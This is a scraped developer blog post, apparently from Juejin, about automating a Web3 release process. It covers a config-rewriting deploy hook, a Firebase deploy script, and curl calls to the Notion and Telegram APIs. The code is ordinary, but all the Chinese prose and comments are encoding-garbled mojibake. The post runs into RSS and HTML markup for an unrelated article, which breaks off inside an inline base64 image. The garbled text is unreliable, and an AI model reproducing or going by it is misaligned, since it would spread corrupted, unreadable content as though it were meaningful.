<strong>16:00</strong> - ç»ˆäºå¯ä»¥æµ‹è¯•äº†ï¼Œå‘ç°ä¸€ä¸ª bug
<strong>16:30</strong> - ä¿®å¤ bugï¼Œé‡æ–°èµ°ä¸€éæµç¨‹...</p>
<p>åˆ°æ™šä¸Š 8 ç‚¹ï¼Œæˆ‘ä»¬æ‰å®Œæˆå‘å¸ƒã€‚æ•´æ•´ <strong>6 ä¸ªå°æ—¶</strong>ã€‚</p>
<p>æ›´ç³Ÿç³•çš„æ˜¯ï¼Œç¬¬äºŒå¤©å‘ç°ç”Ÿäº§ç¯å¢ƒçš„åˆçº¦åœ°å€å’Œæµ‹è¯•ç¯å¢ƒæ··æ·†äº†ï¼ŒåˆèŠ±äº† 2 å°æ—¶ä¿®å¤ã€‚</p>
<p>é‚£ä¸€åˆ»æˆ‘æ„è¯†åˆ°ï¼š<strong>è¿™æ ·ä¸‹å»ä¸è¡Œã€‚</strong></p>
<hr/>
<h2 data-id="heading-1">é—®é¢˜å‡ºåœ¨å“ªé‡Œ</h2>
<p>æˆ‘ä»¬å¤ç›˜äº†æ•´ä¸ªæµç¨‹ï¼Œå‘ç°é—®é¢˜é›†ä¸­åœ¨å‡ ä¸ªåœ°æ–¹ï¼š</p>
<h3 data-id="heading-2">1. æ‰‹åŠ¨æ“ä½œå¤ªå¤š</h3>
<p>æ¯æ¬¡å‘å¸ƒéœ€è¦ï¼š</p>
<ul>
<li>æ‰‹åŠ¨æ‰§è¡Œ 5+ æ¡å‘½ä»¤</li>
<li>æ‰‹åŠ¨ä¿®æ”¹ 3+ ä¸ªé…ç½®æ–‡ä»¶</li>
<li>æ‰‹åŠ¨å¤åˆ¶ç²˜è´´åˆçº¦åœ°å€</li>
<li>æ‰‹åŠ¨å†™å‘å¸ƒæ–‡æ¡£</li>
<li>æ‰‹åŠ¨åœ¨ç¾¤é‡Œé€šçŸ¥</li>
</ul>
<p>ä»»ä½•ä¸€ä¸ªç¯èŠ‚å‡ºé”™ï¼Œéƒ½è¦ä»å¤´å†æ¥ã€‚</p>
<h3 data-id="heading-3">2. æ²¡æœ‰éªŒè¯æœºåˆ¶</h3>
<p>æ”¹äº†é…ç½®ä¸çŸ¥é“å¯¹ä¸å¯¹ï¼Œéƒ¨ç½²å®Œä¸çŸ¥é“æˆä¸æˆåŠŸï¼Œå…¨é ã€Œæ„Ÿè§‰ã€å’Œã€Œè‚‰çœ¼æ£€æŸ¥ã€ã€‚</p>
<h3 data-id="heading-4">3. çŸ¥è¯†åœ¨äººè„‘é‡Œ</h3>
<p>åªæœ‰æˆ‘çŸ¥é“å®Œæ•´çš„å‘å¸ƒæµç¨‹ï¼Œå…¶ä»–äººæ¥æ‰‹æ ¹æœ¬ä¸çŸ¥é“è¯¥æ€ä¹ˆåšã€‚</p>
<h3 data-id="heading-5">4. ç¼ºä¹æ–‡æ¡£åŒ–</h3>
<p>æ¯æ¬¡å‘å¸ƒå®Œï¼Œå˜æ›´äº†ä»€ä¹ˆã€åˆçº¦åœ°å€æ˜¯ä»€ä¹ˆï¼Œå…¨é èŠå¤©è®°å½•æ‰¾ã€‚</p>
<hr/>
<h2 data-id="heading-6">æˆ‘ä»¬åšäº†ä»€ä¹ˆ</h2>
<p>æ¥ä¸‹æ¥çš„ä¸¤ä¸ªæœˆï¼Œæˆ‘ä»¬ä¸€æ­¥æ­¥ä¼˜åŒ–ï¼Œæœ€ç»ˆæŠŠå‘å¸ƒæ—¶é—´å‹ç¼©åˆ°äº† <strong>15 åˆ†é’Ÿ</strong>ã€‚</p>
<h3 data-id="heading-7">ç¬¬ä¸€æ­¥ï¼šæ¢³ç†æµç¨‹ï¼Œç”»å‡ºæµç¨‹å›¾</h3>
<p>æˆ‘ä»¬å…ˆæŠŠæ‰€æœ‰æ­¥éª¤å†™ä¸‹æ¥ï¼Œç”»æˆæµç¨‹å›¾ï¼š</p>
<pre><code class="hljs">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                         å‘å¸ƒæµç¨‹ v1.0                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚  ä»£ç æäº¤ â†’ åˆçº¦éƒ¨ç½² â†’ é…ç½®æ›´æ–° â†’ å‰ç«¯æ‰“åŒ… â†’ éƒ¨ç½²å‘å¸ƒ â†’ æ–‡æ¡£é€šçŸ¥  â”‚
â”‚                                                                 â”‚
â”‚  è€—æ—¶åˆ†å¸ƒï¼š                                                      â”‚
â”‚  â”œâ”€â”€ åˆçº¦éƒ¨ç½²ï¼š30 åˆ†é’Ÿï¼ˆå«ç­‰å¾…ç¡®è®¤ï¼‰                              â”‚
â”‚  â”œâ”€â”€ é…ç½®æ›´æ–°ï¼š15 åˆ†é’Ÿï¼ˆæ‰‹åŠ¨ä¿®æ”¹ + æ£€æŸ¥ï¼‰                         â”‚
â”‚  â”œâ”€â”€ å‰ç«¯æ‰“åŒ…ï¼š10 åˆ†é’Ÿ                                           â”‚
â”‚  â”œâ”€â”€ éƒ¨ç½²å‘å¸ƒï¼š20 åˆ†é’Ÿï¼ˆå«éªŒè¯ï¼‰                                  â”‚
â”‚  â”œâ”€â”€ æ–‡æ¡£é€šçŸ¥ï¼š30 åˆ†é’Ÿï¼ˆæ‰‹åŠ¨ç¼–å†™ï¼‰                                â”‚
â”‚  â””â”€â”€ æ„å¤–å¤„ç†ï¼š60+ åˆ†é’Ÿï¼ˆé…ç½®é”™è¯¯ã€ç¯å¢ƒé—®é¢˜ç­‰ï¼‰                   â”‚
â”‚                                                                 â”‚
â”‚  æ€»è®¡ï¼šçº¦ 3 å°æ—¶ï¼ˆé¡ºåˆ©çš„è¯ï¼‰                                      â”‚
â”‚                                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p>å…‰æ˜¯ç”»å‡ºè¿™å¼ å›¾ï¼Œå°±å‘ç°äº†å¾ˆå¤šé—®é¢˜ã€‚</p>
<h3 data-id="heading-8">ç¬¬äºŒæ­¥ï¼šæ¶ˆç­æ‰‹åŠ¨é…ç½®</h3>
<p>æœ€å®¹æ˜“å‡ºé”™çš„ç¯èŠ‚æ˜¯ã€Œé…ç½®æ›´æ–°ã€â€”â€”æ¯æ¬¡éƒ½è¦æ‰‹åŠ¨æŠŠåˆçº¦åœ°å€å¤åˆ¶åˆ°å‰ç«¯é…ç½®æ–‡ä»¶ã€‚</p>
<p>æˆ‘ä»¬çš„è§£å†³æ–¹æ¡ˆï¼š<strong>è®©éƒ¨ç½²è„šæœ¬è‡ªåŠ¨æ›´æ–°é…ç½®</strong>ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// éƒ¨ç½²å®Œæˆåè‡ªåŠ¨æ‰§è¡Œ</span>
func.<span class="hljs-property">runAtTheEnd</span> = <span class="hljs-literal">true</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateConfig</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// è¯»å–éƒ¨ç½²ç»“æœ</span>
  <span class="hljs-keyword">const</span> staking = <span class="hljs-keyword">await</span> deployments.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Staking'</span>);

  <span class="hljs-comment">// è‡ªåŠ¨æ›´æ–°å‰ç«¯é…ç½®</span>
  <span class="hljs-keyword">const</span> configPath = <span class="hljs-string">'../frontend/src/config/contracts.ts'</span>;
  <span class="hljs-keyword">const</span> config = fs.<span class="hljs-title function_">readFileSync</span>(configPath, <span class="hljs-string">'utf-8'</span>);

  <span class="hljs-keyword">const</span> updated = config.<span class="hljs-title function_">replace</span>(
    <span class="hljs-regexp">/137: {\s*address: "0x[a-fA-F0-9]+"/</span>,
    <span class="hljs-string">`137: { address: "<span class="hljs-subst">${staking.address}</span>"`</span>
  );

  fs.<span class="hljs-title function_">writeFileSync</span>(configPath, updated);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'âœ… é…ç½®å·²è‡ªåŠ¨æ›´æ–°'</span>);
};
</code></pre>
<p><strong>æ•ˆæœ</strong>ï¼šé…ç½®æ›´æ–°ä» 15 åˆ†é’Ÿ â†’ 0 åˆ†é’Ÿï¼Œä¸”é›¶é”™è¯¯ã€‚</p>
<h3 data-id="heading-9">ç¬¬ä¸‰æ­¥ï¼šè„šæœ¬åŒ–éƒ¨ç½²å‘½ä»¤</h3>
<p>æŠŠæ‰€æœ‰éƒ¨ç½²å‘½ä»¤å°è£…æˆè„šæœ¬ï¼Œå‡å°‘è®°å¿†è´Ÿæ‹…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># deploy.sh - ä¸€é”®éƒ¨ç½²è„šæœ¬</span>

TARGET=<span class="hljs-variable">$1</span>  <span class="hljs-comment"># frontend | admin</span>
ENV=<span class="hljs-variable">$2</span>     <span class="hljs-comment"># preview | prod</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"ğŸ“¦ ç›®æ ‡: <span class="hljs-variable">$TARGET</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"ğŸŒ ç¯å¢ƒ: <span class="hljs-variable">$ENV</span>"</span>

<span class="hljs-comment"># æ„å»º</span>
pnpm build:<span class="hljs-variable">$TARGET</span>

<span class="hljs-comment"># éƒ¨ç½²</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$ENV</span>"</span> = <span class="hljs-string">"preview"</span> ]; <span class="hljs-keyword">then</span>
  firebase hosting:channel:deploy preview-<span class="hljs-variable">$RANDOM</span> --only <span class="hljs-variable">$TARGET</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ… é¢„è§ˆç¯å¢ƒéƒ¨ç½²å®Œæˆ"</span>
<span class="hljs-keyword">else</span>
  firebase deploy --only hosting:<span class="hljs-variable">$TARGET</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ… æ­£å¼ç¯å¢ƒéƒ¨ç½²å®Œæˆ"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<p>ç°åœ¨éƒ¨ç½²åªéœ€è¦ä¸€æ¡å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">bash ./scripts/deploy.sh frontend prod
</code></pre>
<p><strong>æ•ˆæœ</strong>ï¼šéƒ¨ç½²æ“ä½œä» 20 åˆ†é’Ÿ â†’ 3 åˆ†é’Ÿã€‚</p>
<h3 data-id="heading-10">ç¬¬å››æ­¥ï¼šå¢åŠ é¢„è§ˆç¯å¢ƒ</h3>
<p>åœ¨æ­£å¼å‘å¸ƒå‰ï¼Œå…ˆéƒ¨ç½²åˆ°é¢„è§ˆç¯å¢ƒéªŒè¯ã€‚è¿™ä¸ªå°æ”¹åŠ¨å¸®æˆ‘ä»¬é¿å…äº†æ— æ•°æ¬¡ã€Œéƒ¨ç½²å®Œæ‰å‘ç°æœ‰é—®é¢˜ã€çš„æƒ…å†µã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å…ˆéƒ¨ç½²åˆ°é¢„è§ˆç¯å¢ƒ</span>
bash ./scripts/deploy.sh frontend preview
<span class="hljs-comment"># éªŒè¯æ— è¯¯åå†å‘å¸ƒæ­£å¼ç‰ˆ</span>
bash ./scripts/deploy.sh frontend prod
</code></pre>
<p><strong>æ•ˆæœ</strong>ï¼šæ„å¤–å¤„ç†æ—¶é—´ä» 60+ åˆ†é’Ÿ â†’ 10 åˆ†é’Ÿï¼ˆå¶å°”ï¼‰ã€‚</p>
<h3 data-id="heading-11">ç¬¬äº”æ­¥ï¼šæ–‡æ¡£è‡ªåŠ¨åŒ–</h3>
<p>æ¯æ¬¡å‘å¸ƒéƒ½è¦å†™æ–‡æ¡£ï¼Œè€Œä¸”æ–‡æ¡£æ ¼å¼åŸºæœ¬å›ºå®šã€‚æˆ‘ä»¬æŠŠå®ƒè‡ªåŠ¨åŒ–äº†ï¼š</p>
<ol>
<li><strong>æœ¬åœ°æ–‡æ¡£</strong>ï¼šåŸºäºæ¨¡æ¿è‡ªåŠ¨ç”Ÿæˆ markdown æ–‡ä»¶</li>
<li><strong>Notion æ–‡æ¡£</strong>ï¼šé€šè¿‡ API è‡ªåŠ¨åˆ›å»ºé¡µé¢</li>
<li><strong>å›¢é˜Ÿé€šçŸ¥</strong>ï¼šé€šè¿‡ Telegram Bot è‡ªåŠ¨å‘é€</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»º Notion æ–‡æ¡£</span>
curl -X POST <span class="hljs-string">'https://api.notion.com/v1/pages'</span> \
  -H <span class="hljs-string">"Authorization: Bearer <span class="hljs-variable">$NOTION_TOKEN</span>"</span> \
  -d <span class="hljs-string">'{ "parent": {...}, "properties": {...}, "children": [...] }'</span>

<span class="hljs-comment"># å‘é€ Telegram é€šçŸ¥</span>
curl -X POST <span class="hljs-string">"https://api.telegram.org/bot<span class="hljs-variable">$TOKEN</span>/sendMessage"</span> \
  -d <span class="hljs-string">'{ "chat_id": "...", "text": "ğŸš€ v1.4.0 å·²ä¸Šçº¿..." }'</span>
</code></pre>
<p><strong>æ•ˆæœ</strong>ï¼šæ–‡æ¡£é€šçŸ¥ä» 30 åˆ†é’Ÿ â†’ 2 åˆ†é’Ÿã€‚</p>
<hr/>
<h2 data-id="heading-12">ä¼˜åŒ–å‰ vs ä¼˜åŒ–å</h2>





















































<table><thead><tr><th>ç¯èŠ‚</th><th>ä¼˜åŒ–å‰</th><th>ä¼˜åŒ–å</th><th>æå‡</th></tr></thead><tbody><tr><td>åˆçº¦éƒ¨ç½²</td><td>30 åˆ†é’Ÿ</td><td>5 åˆ†é’Ÿ</td><td>6x</td></tr><tr><td>é…ç½®æ›´æ–°</td><td>15 åˆ†é’Ÿ</td><td>0 åˆ†é’Ÿ</td><td>âˆ</td></tr><tr><td>å‰ç«¯æ‰“åŒ…</td><td>10 åˆ†é’Ÿ</td><td>3 åˆ†é’Ÿ</td><td>3x</td></tr><tr><td>éƒ¨ç½²å‘å¸ƒ</td><td>20 åˆ†é’Ÿ</td><td>3 åˆ†é’Ÿ</td><td>7x</td></tr><tr><td>æ–‡æ¡£é€šçŸ¥</td><td>30 åˆ†é’Ÿ</td><td>2 åˆ†é’Ÿ</td><td>15x</td></tr><tr><td>æ„å¤–å¤„ç†</td><td>60 åˆ†é’Ÿ</td><td>2 åˆ†é’Ÿ</td><td>30x</td></tr><tr><td><strong>æ€»è®¡</strong></td><td><strong>~3 å°æ—¶</strong></td><td><strong>~15 åˆ†é’Ÿ</strong></td><td><strong>12x</strong></td></tr></tbody></table>
<p>æœ€é‡è¦çš„æ˜¯ï¼š<strong>ä»»ä½•äººéƒ½å¯ä»¥æ‰§è¡Œè¿™ä¸ªæµç¨‹</strong>ï¼Œä¸å†ä¾èµ–ç‰¹å®šçš„äººã€‚</p>
<hr/>
<h2 data-id="heading-13">æˆ‘ä»¬å­¦åˆ°äº†ä»€ä¹ˆ</h2>
<h3 data-id="heading-14">1. è‡ªåŠ¨åŒ–è¦ä»ç—›ç‚¹å¼€å§‹</h3>
<p>ä¸è¦è¯•å›¾ä¸€æ¬¡æ€§è‡ªåŠ¨åŒ–æ‰€æœ‰ä¸œè¥¿ã€‚å…ˆæ‰¾åˆ°æœ€ç—›çš„ç‚¹ï¼ˆå¯¹æˆ‘ä»¬æ¥è¯´æ˜¯é…ç½®æ›´æ–°ï¼‰ï¼Œè§£å†³å®ƒï¼Œç„¶åå†å¤„ç†ä¸‹ä¸€ä¸ªã€‚</p>
<h3 data-id="heading-15">2. è„šæœ¬æ¯”æ–‡æ¡£æ›´å¯é </h3>
<p>ä¸å…¶å†™ä¸€ä»½ã€Œå¦‚ä½•éƒ¨ç½²ã€çš„æ–‡æ¡£ï¼Œä¸å¦‚å†™ä¸€ä¸ªéƒ¨ç½²è„šæœ¬ã€‚è„šæœ¬ä¸ä¼šè¿‡æ—¶ï¼Œè€Œæ–‡æ¡£ä¼šã€‚</p>
<h3 data-id="heading-16">3. é¢„è§ˆç¯å¢ƒæ˜¯å¿…é¡»çš„</h3>
<p>å¤šèŠ± 2 åˆ†é’Ÿéƒ¨ç½²åˆ°é¢„è§ˆç¯å¢ƒéªŒè¯ï¼Œèƒ½çœä¸‹æ— æ•°æ¬¡ã€Œç´§æ€¥ä¿®å¤ã€ã€‚</p>
<h3 data-id="heading-17">4. è®©æœºå™¨åšæœºå™¨æ“…é•¿çš„äº‹</h3>
<p>å¤åˆ¶ç²˜è´´ã€æ ¼å¼æ£€æŸ¥ã€å‘é€é€šçŸ¥â€”â€”è¿™äº›äº‹æƒ…æœºå™¨æ¯”äººåšå¾—æ›´å¥½ã€‚</p>
<h3 data-id="heading-18">5. æµç¨‹å¯è§†åŒ–å¾ˆé‡è¦</h3>
<p>å½“ä½ æŠŠæµç¨‹ç”»å‡ºæ¥ï¼Œé—®é¢˜å°±å˜å¾—æ˜¾è€Œæ˜“è§äº†ã€‚</p>
<hr/>
<h2 data-id="heading-19">ä¸‹ä¸€æ­¥è®¡åˆ’</h2>
<p>æˆ‘ä»¬çš„å‘å¸ƒæµç¨‹è¿˜åœ¨æŒç»­ä¼˜åŒ–ã€‚æ¥ä¸‹æ¥è®¡åˆ’åšçš„äº‹æƒ…ï¼š</p>
<ol>
<li><strong>æ¥å…¥ GitHub Actions</strong>ï¼šå®ç° push åˆ° main åˆ†æ”¯è‡ªåŠ¨éƒ¨ç½²</li>
<li><strong>å¢åŠ è‡ªåŠ¨åŒ–æµ‹è¯•</strong>ï¼šéƒ¨ç½²å‰è‡ªåŠ¨è¿è¡Œæµ‹è¯•ç”¨ä¾‹</li>
<li><strong>ç›‘æ§å‘Šè­¦</strong>ï¼šéƒ¨ç½²åè‡ªåŠ¨æ£€æŸ¥æœåŠ¡å¥åº·çŠ¶æ€</li>
<li><strong>ä¸€é”®å›æ»š</strong>ï¼šå‡ºé—®é¢˜æ—¶èƒ½å¿«é€Ÿå›æ»šåˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬</li>
</ol>
<hr/>
<h2 data-id="heading-20">å†™åœ¨æœ€å</h2>
<p>ä» 3 å°æ—¶åˆ° 15 åˆ†é’Ÿï¼Œçœ‹èµ·æ¥æ˜¯ 10 å€çš„æ•ˆç‡æå‡ï¼Œä½†çœŸæ­£çš„æ”¶ç›Šè¿œä¸æ­¢äºæ­¤ï¼š</p>
<ul>
<li><strong>æ›´å°‘çš„äººä¸ºé”™è¯¯</strong>ï¼šè‡ªåŠ¨åŒ–æ¶ˆé™¤äº†å¤§éƒ¨åˆ†æ‰‹åŠ¨æ“ä½œçš„é£é™©</li>
<li><strong>æ›´å¿«çš„è¿­ä»£é€Ÿåº¦</strong>ï¼šå‘å¸ƒä¸å†æ˜¯ã€Œå¤§äº‹ã€ï¼Œå¯ä»¥æ›´é¢‘ç¹åœ°å‘å¸ƒå°æ”¹åŠ¨</li>
<li><strong>æ›´å¥½çš„å›¢é˜Ÿåä½œ</strong>ï¼šä»»ä½•äººéƒ½å¯ä»¥æ‰§è¡Œå‘å¸ƒï¼Œä¸å†æœ‰ã€Œå…³é”®äººä¾èµ–ã€</li>
<li><strong>æ›´å°‘çš„ç„¦è™‘</strong>ï¼šå‘å¸ƒä¸å†è®©äººç´§å¼ ï¼Œå› ä¸ºæµç¨‹æ˜¯å¯é¢„æœŸçš„</li>
</ul>
<p>å¦‚æœä½ çš„å›¢é˜Ÿä¹Ÿåœ¨ä¸ºå‘å¸ƒæµç¨‹å¤´ç–¼ï¼Œå¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½ç»™ä½ ä¸€äº›å¯å‘ã€‚</p>
<p>è®°ä½ï¼š<strong>æœ€å¥½çš„æµç¨‹æ˜¯ä¸éœ€è¦æ€è€ƒçš„æµç¨‹ã€‚</strong></p>
<hr/>
<blockquote>
<p>æœ¬æ–‡æ¥è‡ª <strong>AI SOP è“çš®ä¹¦</strong> çš„å®æˆ˜ç»éªŒåˆ†äº«ã€‚</p>
<p>ğŸ“˜ <strong>AI SOP è“çš®ä¹¦</strong>ï¼šä¸€ä¸ªä¸“æ³¨äº AI + Web3 å·¥ä½œæµä¼˜åŒ–çš„å¼€æºé¡¹ç›®ï¼Œé€šè¿‡æ ‡å‡†åŒ– SOP è®©å›¢é˜Ÿæ•ˆç‡æå‡ 10 å€ã€‚</p>
<p>ğŸ”— GitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsmartchainark%2Fai-web3-blueprint" target="_blank" title="https://github.com/smartchainark/ai-web3-blueprint" ref="nofollow noopener noreferrer">github.com/smartchainaâ€¦</a></p>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ Star æ”¯æŒï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å†å²åå¤§å¸ç‹æ‹‰åˆ°ä¸€ä¸ªç¾¤èŠä¼šå‘ç”Ÿä»€ä¹ˆäº‹ï¼Ÿæœ±å…ƒç’‹ç›´æ¥å¼€å–·]]></title>    <link>https://juejin.cn/post/7589920318132862976</link>    <guid>https://juejin.cn/post/7589920318132862976</guid>    <pubDate>2026-01-01T08:55:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589920318132862976" data-draft-id="7589918470789496866" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å†å²åå¤§å¸ç‹æ‹‰åˆ°ä¸€ä¸ªç¾¤èŠä¼šå‘ç”Ÿä»€ä¹ˆäº‹ï¼Ÿæœ±å…ƒç’‹ç›´æ¥å¼€å–·"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-01T08:55:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LucianaiB"/> <meta itemprop="url" content="https://juejin.cn/user/1269294586664749"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å†å²åå¤§å¸ç‹æ‹‰åˆ°ä¸€ä¸ªç¾¤èŠä¼šå‘ç”Ÿä»€ä¹ˆäº‹ï¼Ÿæœ±å…ƒç’‹ç›´æ¥å¼€å–·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1269294586664749/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LucianaiB
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:55:50.000Z" title="Thu Jan 01 2026 08:55:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOz